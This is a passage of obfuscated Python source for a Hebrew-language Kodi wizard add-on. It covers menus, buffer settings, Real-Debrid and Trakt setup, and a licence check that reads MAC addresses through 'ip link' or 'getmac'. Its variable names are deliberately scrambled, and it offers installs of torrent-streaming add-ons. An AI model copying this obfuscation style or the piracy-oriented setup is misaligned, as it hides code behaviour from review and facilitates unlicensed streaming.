				if len (OOO0O000O0OO0O0O0 )==0 :#line:1693
					OOO0O000O0OO0O0O0 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO0OO0OO0OO0OO0O0 )#line:1694
				for OOOO00OOOO000OO0O in OOO0O000O0OO0O0O0 :#line:1695
					OOOO000OOOOO0OO0O =OOOO00OOOO000OO0O [0 ]#line:1696
					if OOOO000OOOOO0OO0O in "'\"":#line:1697
						if OOOO00OOOO000OO0O .find ('='+OOOO000OOOOO0OO0O ,OOOO00OOOO000OO0O .find (OOOO000OOOOO0OO0O ,1 ))>-1 :#line:1698
							OOOO00OOOO000OO0O =OOOO00OOOO000OO0O [:OOOO00OOOO000OO0O .find ('='+OOOO000OOOOO0OO0O ,OOOO00OOOO000OO0O .find (OOOO000OOOOO0OO0O ,1 ))]#line:1699
						if OOOO00OOOO000OO0O .rfind (OOOO000OOOOO0OO0O ,1 )>-1 :#line:1701
							OOOO00OOOO000OO0O =OOOO00OOOO000OO0O [1 :OOOO00OOOO000OO0O .rfind (OOOO000OOOOO0OO0O )]#line:1702
					else :#line:1703
						if OOOO00OOOO000OO0O .find (" ")>0 :#line:1704
							OOOO00OOOO000OO0O =OOOO00OOOO000OO0O [:OOOO00OOOO000OO0O .find (" ")]#line:1705
						elif OOOO00OOOO000OO0O .find ("/")>0 :#line:1706
							OOOO00OOOO000OO0O =OOOO00OOOO000OO0O [:OOOO00OOOO000OO0O .find ("/")]#line:1707
						elif OOOO00OOOO000OO0O .find (">")>0 :#line:1708
							OOOO00OOOO000OO0O =OOOO00OOOO000OO0O [:OOOO00OOOO000OO0O .find (">")]#line:1709
					O00OO0OO0000OOOO0 .append (OOOO00OOOO000OO0O .strip ())#line:1711
			O0000O00O00O0OO0O =O00OO0OO0000OOOO0 #line:1712
		else :#line:1713
			O00OO0OO0000OOOO0 =[]#line:1714
			for OO0OO0OO0OO0OO0O0 in O0000O00O00O0OO0O :#line:1715
				O0OOO00O00OOO00O0 =u"</"+name #line:1716
				O00O0O0000000OOO0 =O00O0O0OO0OO0O0O0 .find (OO0OO0OO0OO0OO0O0 )#line:1718
				OOO00OO0OO00000OO =O00O0O0OO0OO0O0O0 .find (O0OOO00O00OOO00O0 ,O00O0O0000000OOO0 )#line:1719
				O0O00OOO0000O0OOO =O00O0O0OO0OO0O0O0 .find ("<"+name ,O00O0O0000000OOO0 +1 )#line:1720
				while O0O00OOO0000O0OOO <OOO00OO0OO00000OO and O0O00OOO0000O0OOO !=-1 :#line:1722
					O00OOO0OO0OO0000O =O00O0O0OO0OO0O0O0 .find (O0OOO00O00OOO00O0 ,OOO00OO0OO00000OO +len (O0OOO00O00OOO00O0 ))#line:1723
					if O00OOO0OO0OO0000O !=-1 :#line:1724
						OOO00OO0OO00000OO =O00OOO0OO0OO0000O #line:1725
					O0O00OOO0000O0OOO =O00O0O0OO0OO0O0O0 .find ("<"+name ,O0O00OOO0000O0OOO +1 )#line:1726
				if O00O0O0000000OOO0 ==-1 and OOO00OO0OO00000OO ==-1 :#line:1728
					O000O00O0000O0OO0 =u""#line:1729
				elif O00O0O0000000OOO0 >-1 and OOO00OO0OO00000OO >-1 :#line:1730
					O000O00O0000O0OO0 =O00O0O0OO0OO0O0O0 [O00O0O0000000OOO0 +len (OO0OO0OO0OO0OO0O0 ):OOO00OO0OO00000OO ]#line:1731
				elif OOO00OO0OO00000OO >-1 :#line:1732
					O000O00O0000O0OO0 =O00O0O0OO0OO0O0O0 [:OOO00OO0OO00000OO ]#line:1733
				elif O00O0O0000000OOO0 >-1 :#line:1734
					O000O00O0000O0OO0 =O00O0O0OO0OO0O0O0 [O00O0O0000000OOO0 +len (OO0OO0OO0OO0OO0O0 ):]#line:1735
				if ret :#line:1737
					O0OOO00O00OOO00O0 =O00O0O0OO0OO0O0O0 [OOO00OO0OO00000OO :O00O0O0OO0OO0O0O0 .find (">",O00O0O0OO0OO0O0O0 .find (O0OOO00O00OOO00O0 ))+1 ]#line:1738
					O000O00O0000O0OO0 =OO0OO0OO0OO0OO0O0 +O000O00O0000O0OO0 +O0OOO00O00OOO00O0 #line:1739
				O00O0O0OO0OO0O0O0 =O00O0O0OO0OO0O0O0 [O00O0O0OO0OO0O0O0 .find (O000O00O0000O0OO0 ,O00O0O0OO0OO0O0O0 .find (OO0OO0OO0OO0OO0O0 ))+len (O000O00O0000O0OO0 ):]#line:1741
				O00OO0OO0000OOOO0 .append (O000O00O0000O0OO0 )#line:1742
			O0000O00O00O0OO0O =O00OO0OO0000OOOO0 #line:1743
		OO0000O0OO0OO0OO0 +=O0000O00O00O0OO0O #line:1744
	return OO0000O0OO0OO0OO0 #line:1746
def addItem (OO0O00OO00OO0OOO0 ,OOO000OO00O0OO000 ,O00O0O0O0O00OOO00 ,O0O0OOOOO000O0OOO ,OOOO000OOO0OOO0O0 ,description =None ):#line:1748
	if description ==None :description =''#line:1749
	description ='[COLOR white]'+description +'[/COLOR]'#line:1750
	O000O0OO0OO00O0OO =sys .argv [0 ]+"?url="+urllib .quote_plus (OOO000OO00O0OO000 )+"&mode="+str (O00O0O0O0O00OOO00 )+"&name="+urllib .quote_plus (OO0O00OO00OO0OOO0 )+"&iconimage="+urllib .quote_plus (O0O0OOOOO000O0OOO )+"&fanart="+urllib .quote_plus (OOOO000OOO0OOO0O0 )#line:1751
	O0O00000OOOO00OOO =True #line:1752
	OO000OOOOO0O00OO0 =xbmcgui .ListItem (OO0O00OO00OO0OOO0 ,iconImage =O0O0OOOOO000O0OOO ,thumbnailImage =O0O0OOOOO000O0OOO )#line:1753
	OO000OOOOO0O00OO0 .setInfo (type ="Video",infoLabels ={"Title":OO0O00OO00OO0OOO0 ,"Plot":description })#line:1754
	OO000OOOOO0O00OO0 .setProperty ("fanart_Image",OOOO000OOO0OOO0O0 )#line:1755
	OO000OOOOO0O00OO0 .setProperty ("icon_Image",O0O0OOOOO000O0OOO )#line:1756
	O0O00000OOOO00OOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O000O0OO0OO00O0OO ,listitem =OO000OOOOO0O00OO0 ,isFolder =False )#line:1757
	return O0O00000OOOO00OOO #line:1758
def get_params ():#line:1760
		OO00OOOO0OO00000O =[]#line:1761
		O00O00OOOOOOOOOO0 =sys .argv [2 ]#line:1762
		if len (O00O00OOOOOOOOOO0 )>=2 :#line:1763
				O00OO0O00O0000000 =sys .argv [2 ]#line:1764
				O0O000O0O00O000O0 =O00OO0O00O0000000 .replace ('?','')#line:1765
				if (O00OO0O00O0000000 [len (O00OO0O00O0000000 )-1 ]=='/'):#line:1766
						O00OO0O00O0000000 =O00OO0O00O0000000 [0 :len (O00OO0O00O0000000 )-2 ]#line:1767
				OO0OOO00O0OO00000 =O0O000O0O00O000O0 .split ('&')#line:1768
				OO00OOOO0OO00000O ={}#line:1769
				for OO00O00000OOOO000 in range (len (OO0OOO00O0OO00000 )):#line:1770
						OOO00OOOOOO00O00O ={}#line:1771
						OOO00OOOOOO00O00O =OO0OOO00O0OO00000 [OO00O00000OOOO000 ].split ('=')#line:1772
						if (len (OOO00OOOOOO00O00O ))==2 :#line:1773
								OO00OOOO0OO00000O [OOO00OOOOOO00O00O [0 ]]=OOO00OOOOOO00O00O [1 ]#line:1774
		return OO00OOOO0OO00000O #line:1776
def decode (OO0OO00OOO0OO000O ,OOOOO0OOO0O0OOO0O ):#line:1781
    import base64 #line:1782
    O00O0O0OO0O00OOOO =[]#line:1783
    if (len (OO0OO00OOO0OO000O ))!=4 :#line:1785
     return 10 #line:1786
    OOOOO0OOO0O0OOO0O =base64 .urlsafe_b64decode (OOOOO0OOO0O0OOO0O )#line:1787
    for O0OOOOO0OOO000OO0 in range (len (OOOOO0OOO0O0OOO0O )):#line:1789
        OO0OOO0000O0O000O =OO0OO00OOO0OO000O [O0OOOOO0OOO000OO0 %len (OO0OO00OOO0OO000O )]#line:1790
        OO00OOOOO0OOO0000 =chr ((256 +ord (OOOOO0OOO0O0OOO0O [O0OOOOO0OOO000OO0 ])-ord (OO0OOO0000O0O000O ))%256 )#line:1791
        O00O0O0OO0O00OOOO .append (OO00OOOOO0OOO0000 )#line:1792
    return "".join (O00O0O0OO0O00OOOO )#line:1793
def tmdb_list (OOOOO0000OO000000 ):#line:1794
    OO0O00OO0O000OOO0 =decode ("7643",OOOOO0000OO000000 )#line:1797
    return int (OO0O00OO0O000OOO0 )#line:1800
def u_list (OO00OOOO0OOO000O0 ):#line:1801
    from math import sqrt #line:1803
    OOO0O00O0OOOO00O0 =tmdb_list (TMDB_NEW_API )#line:1804
    O00OOO0OOOOOO0000 =str ((getHwAddr ('eth0'))*OOO0O00O0OOOO00O0 )#line:1806
    O0OOOOOO0O0O0OOO0 =int (O00OOO0OOOOOO0000 [1 ]+O00OOO0OOOOOO0000 [2 ]+O00OOO0OOOOOO0000 [5 ]+O00OOO0OOOOOO0000 [7 ])#line:1807
    OO000OOO0O0O00OOO =(ADDON .getSetting ("pass"))#line:1809
    OOO0O00OO0O0O0O00 =(str (round (sqrt ((O0OOOOOO0O0O0OOO0 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1814
    if '.'in OOO0O00OO0O0O0O00 :#line:1815
     OOO0O00OO0O0O0O00 =(str (round (sqrt ((O0OOOOOO0O0O0OOO0 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1816
    if OO000OOO0O0O00OOO ==OOO0O00OO0O0O0O00 :#line:1818
      O00OO0OOOOOO0OO00 =OO00OOOO0OOO000O0 #line:1820
    else :#line:1822
       if STARTP2 ()and STARTP ()=='ok':#line:1823
         return OO00OOOO0OOO000O0 #line:1826
       O00OO0OOOOOO0OO00 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1827
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1828
       sys .exit ()#line:1829
    return O00OO0OOOOOO0OO00 #line:1830
def disply_hwr ():#line:1833
   try :#line:1834
    OO00O00000O0OO000 =tmdb_list (TMDB_NEW_API )#line:1835
    O0O0000000000000O =str ((getHwAddr ('eth0'))*OO00O00000O0OO000 )#line:1836
    OOOO0OOO0OO0O00O0 =(O0O0000000000000O [1 ]+O0O0000000000000O [2 ]+O0O0000000000000O [5 ]+O0O0000000000000O [7 ])#line:1843
    OOOOOO0OO000O0OOO =(ADDON .getSetting ("action"))#line:1844
    wiz .setS ('action',str (OOOO0OOO0OO0O00O0 ))#line:1846
   except :pass #line:1847
def disply_hwr2 ():#line:1848
   try :#line:1849
    O000O00OOO000OO0O =tmdb_list (TMDB_NEW_API )#line:1850
    OO0OOOO000O0O000O =str ((getHwAddr ('eth0'))*O000O00OOO000OO0O )#line:1852
    OOO00O00O000O0O00 =(OO0OOOO000O0O000O [1 ]+OO0OOOO000O0O000O [2 ]+OO0OOOO000O0O000O [5 ]+OO0OOOO000O0O000O [7 ])#line:1861
    O00OO0O0O0OO0OO0O =(ADDON .getSetting ("action"))#line:1862
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OOO00O00O000O0O00 )#line:1865
   except :pass #line:1866
def getHwAddr (O0O0O0OOO00O0000O ):#line:1868
   import subprocess ,time #line:1869
   O00OOOOOOO00O000O ='windows'#line:1870
   if xbmc .getCondVisibility ('system.platform.android'):#line:1871
       O00OOOOOOO00O000O ='android'#line:1872
   if xbmc .getCondVisibility ('system.platform.android'):#line:1873
     OOOOO00000OO0O0O0 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1874
     OOO00O0O000OOO00O =re .compile ('link/ether (.+?) brd').findall (str (OOOOO00000OO0O0O0 ))#line:1876
     OOOOOOO000O00OO0O =0 #line:1877
     for O0O0OOO0000O0OO00 in OOO00O0O000OOO00O :#line:1878
      if OOO00O0O000OOO00O !='00:00:00:00:00:00':#line:1879
          O0O0000O0000O00OO =O0O0OOO0000O0OO00 #line:1880
          OOOOOOO000O00OO0O =OOOOOOO000O00OO0O +int (O0O0000O0000O00OO .replace (':',''),16 )#line:1881
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1883
       OO00O0O0O000000O0 =0 #line:1884
       OOOOOOO000O00OO0O =0 #line:1885
       O0O0000OOO0O0O0OO =[]#line:1886
       OO00O0O00O0O00000 =os .popen ("getmac").read ()#line:1887
       OO00O0O00O0O00000 =OO00O0O00O0O00000 .split ("\n")#line:1888
       for O000OO000000O0OO0 in OO00O0O00O0O00000 :#line:1890
            O00OOO0OOOO0O0000 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O000OO000000O0OO0 ,re .I )#line:1891
            if O00OOO0OOOO0O0000 :#line:1892
                OOO00O0O000OOO00O =O00OOO0OOOO0O0000 .group ().replace ('-',':')#line:1893
                O0O0000OOO0O0O0OO .append (OOO00O0O000OOO00O )#line:1894
                OOOOOOO000O00OO0O =OOOOOOO000O00OO0O +int (OOO00O0O000OOO00O .replace (':',''),16 )#line:1897
   else :#line:1899
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1900
   try :#line:1917
    return OOOOOOO000O00OO0O #line:1918
   except :pass #line:1919
def getpass ():#line:1920
	disply_hwr2 ()#line:1922
def setpass ():#line:1923
    OOO00O0000O000OOO =xbmcgui .Dialog ()#line:1924
    OO00O0O00OOO0O0OO =''#line:1925
    O000000OO0O0O000O =xbmc .Keyboard (OO00O0O00OOO0O0OO ,'הכנס סיסמה')#line:1927
    O000000OO0O0O000O .doModal ()#line:1928
    if O000000OO0O0O000O .isConfirmed ():#line:1929
           O000000OO0O0O000O =O000000OO0O0O000O .getText ()#line:1930
    wiz .setS ('pass',str (O000000OO0O0O000O ))#line:1931
def setuname ():#line:1932
    O0O0OOOO0O0O0O0O0 =''#line:1933
    O0O000O0OO0OOO0OO =xbmc .Keyboard (O0O0OOOO0O0O0O0O0 ,'הכנס שם משתמש')#line:1934
    O0O000O0OO0OOO0OO .doModal ()#line:1935
    if O0O000O0OO0OOO0OO .isConfirmed ():#line:1936
           O0O0OOOO0O0O0O0O0 =O0O000O0OO0OOO0OO .getText ()#line:1937
           wiz .setS ('user',str (O0O0OOOO0O0O0O0O0 ))#line:1938
def powerkodi ():#line:1939
    os ._exit (1 )#line:1940
def buffer1 ():#line:1942
	OO00O00O00OO00000 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1943
	O000OOOOO0O0O000O =xbmc .getInfoLabel ("System.Memory(total)")#line:1944
	OOO00OOOOOO00OOO0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1945
	OO0O00OO00OO00O0O =re .sub ('[^0-9]','',OOO00OOOOOO00OOO0 )#line:1946
	OO0O00OO00OO00O0O =int (OO0O00OO00OO00O0O )/3 #line:1947
	O0O0O00O0OO0O0000 =OO0O00OO00OO00O0O *1024 *1024 #line:1948
	try :O0OOOOO00OO00OO00 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1949
	except :O0OOOOO00OO00OO00 =16 #line:1950
	OOOOOO0O0OOOO0O0O =DIALOG .yesno ('FREE MEMORY: '+str (OOO00OOOOOO00OOO0 ),'Based on your free Memory your optimal buffersize is: '+str (OO0O00OO00OO00O0O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1953
	if OOOOOO0O0OOOO0O0O ==1 :#line:1954
		with open (OO00O00O00OO00000 ,"w")as OOO00O000O0O0OOOO :#line:1955
			if O0OOOOO00OO00OO00 >=17 :O0OOOOO00OO00O00O =xml_data_advSettings_New (str (O0O0O00O0OO0O0000 ))#line:1956
			else :O0OOOOO00OO00O00O =xml_data_advSettings_old (str (O0O0O00O0OO0O0000 ))#line:1957
			OOO00O000O0O0OOOO .write (O0OOOOO00OO00O00O )#line:1959
			DIALOG .ok ('Buffer Size Set to: '+str (O0O0O00O0OO0O0000 ),'Please restart Kodi for settings to apply.','')#line:1960
	elif OOOOOO0O0OOOO0O0O ==0 :#line:1962
		O0O0O00O0OO0O0000 =_O0O0OOO000O0O0O00 (default =str (O0O0O00O0OO0O0000 ),heading ="INPUT BUFFER SIZE")#line:1963
		with open (OO00O00O00OO00000 ,"w")as OOO00O000O0O0OOOO :#line:1964
			if O0OOOOO00OO00OO00 >=17 :O0OOOOO00OO00O00O =xml_data_advSettings_New (str (O0O0O00O0OO0O0000 ))#line:1965
			else :O0OOOOO00OO00O00O =xml_data_advSettings_old (str (O0O0O00O0OO0O0000 ))#line:1966
			OOO00O000O0O0OOOO .write (O0OOOOO00OO00O00O )#line:1967
			DIALOG .ok ('Buffer Size Set to: '+str (O0O0O00O0OO0O0000 ),'Please restart Kodi for settings to apply.','')#line:1968
def xml_data_advSettings_old (OO0OO000000O0OOO0 ):#line:1969
	OO000OO0OOO0O0OOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO0OO000000O0OOO0 #line:1979
	return OO000OO0OOO0O0OOO #line:1980
def xml_data_advSettings_New (O00000O00OO00OO0O ):#line:1982
	O000OOO0O0O0O0OOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O00000O00OO00OO0O #line:1994
	return O000OOO0O0O0O0OOO #line:1995
def write_ADV_SETTINGS_XML (OOOO000OOO0O0OO0O ):#line:1996
    if not os .path .exists (xml_file ):#line:1997
        with open (xml_file ,"w")as O0O0000O0O00O0O00 :#line:1998
            O0O0000O0O00O0O00 .write (xml_data )#line:1999
def _O0O0OOO000O0O0O00 (default ="",heading ="",hidden =False ):#line:2000
    ""#line:2001
    OOO0OO0O0O0O0O0O0 =xbmc .Keyboard (default ,heading ,hidden )#line:2002
    OOO0OO0O0O0O0O0O0 .doModal ()#line:2003
    if (OOO0OO0O0O0O0O0O0 .isConfirmed ()):#line:2004
        return unicode (OOO0OO0O0O0O0O0O0 .getText (),"utf-8")#line:2005
    return default #line:2006
def index ():#line:2008
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2009
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2010
	if AUTOUPDATE =='Yes':#line:2011
		if wiz .workingURL (WIZARDFILE )==True :#line:2012
			OO00000OOOOO0O0OO =wiz .checkWizard ('version')#line:2013
			if OO00000OOOOO0O0OO >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO00000OOOOO0O0OO ),'wizardupdate',themeit =THEME2 )#line:2014
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2015
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2016
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2017
	if len (BUILDNAME )>0 :#line:2018
		OOO0O000OO0OOO0OO =wiz .checkBuild (BUILDNAME ,'version')#line:2019
		O0O00O0O000O0OOO0 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2020
		if OOO0O000OO0OOO0OO >BUILDVERSION :O0O00O0O000O0OOO0 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0O00O0O000O0OOO0 ,OOO0O000OO0OOO0OO )#line:2021
		addDir (O0O00O0O000O0OOO0 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2023
		try :#line:2025
		     O00O0OO0000O00000 =wiz .themeCount (BUILDNAME )#line:2026
		except :#line:2027
		   O00O0OO0000O00000 =False #line:2028
		if not O00O0OO0000O00000 ==False :#line:2029
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2030
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2031
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2034
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2035
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2036
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2040
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2042
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2044
def morsetup ():#line:2046
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2047
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2048
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2049
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2050
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2051
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2055
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2056
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2059
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2060
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2070
	setView ('files','viewType')#line:2071
def morsetup2 ():#line:2072
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2073
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2074
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2075
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2076
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2077
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2078
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2079
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2080
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2081
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2082
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2083
def fastupdate ():#line:2084
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2085
def forcefastupdate ():#line:2087
			OOO0O00O0OOO0OOO0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2088
			wiz .ForceFastUpDate (ADDONTITLE ,OOO0O00O0OOO0OOO0 )#line:2089
def rdsetup ():#line:2093
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2094
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2095
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2097
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2098
def traktsetup ():#line:2101
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2102
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2103
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2104
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2105
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2106
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2107
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2108
	setView ('files','viewType')#line:2109
def setautorealdebrid ():#line:2110
    from resources .libs import real_debrid #line:2111
    OO0O000O000OOO0O0 =real_debrid .RealDebridFirst ()#line:2112
    OO0O000O000OOO0O0 .auth ()#line:2113
def setrealdebrid ():#line:2115
    O00O0OO0000OO0000 =(ADDON .getSetting ("auto_rd"))#line:2116
    if O00O0OO0000OO0000 =='false':#line:2117
       ADDON .openSettings ()#line:2118
    else :#line:2119
        from resources .libs import real_debrid #line:2120
        O000000OOO00O0OOO =real_debrid .RealDebrid ()#line:2121
        O000000OOO00O0OOO .auth ()#line:2122
        rdon ()#line:2125
def resolveurlsetup ():#line:2127
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2128
def urlresolversetup ():#line:2129
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2130
def placentasetup ():#line:2132
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2133
def reptiliasetup ():#line:2134
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2135
def flixnetsetup ():#line:2136
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2137
def yodasetup ():#line:2138
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2139
def numberssetup ():#line:2140
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2141
def uranussetup ():#line:2142
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2143
def genesissetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2145
def net_tools (view =None ):#line:2147
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2148
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2149
	setView ('files','viewType')#line:2151
def speedMenu ():#line:2152
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2153
def viewIP ():#line:2154
	OO0OO000O000OO0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2168
	OO00O00O000O0OOO0 =[];OO0OO0OO0OO000O00 =0 #line:2169
	for O0OO00OO00O0OOOOO in OO0OO000O000OO0O0 :#line:2170
		OO00000OOOO0O0O00 =wiz .getInfo (O0OO00OO00O0OOOOO )#line:2171
		O00OOOOO0O0OOO000 =0 #line:2172
		while OO00000OOOO0O0O00 =="Busy"and O00OOOOO0O0OOO000 <10 :#line:2173
			OO00000OOOO0O0O00 =wiz .getInfo (O0OO00OO00O0OOOOO );O00OOOOO0O0OOO000 +=1 ;wiz .log ("%s sleep %s"%(O0OO00OO00O0OOOOO ,str (O00OOOOO0O0OOO000 )));xbmc .sleep (1000 )#line:2174
		OO00O00O000O0OOO0 .append (OO00000OOOO0O0O00 )#line:2175
		OO0OO0OO0OO000O00 +=1 #line:2176
	O000OOO000OOOOO00 ,OOO00OOOO00O00000 ,OOO00000O000OOOOO =getIP ()#line:2177
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O00O000O0OOO0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2178
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOO000OOOOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2179
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOOO00O00000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2180
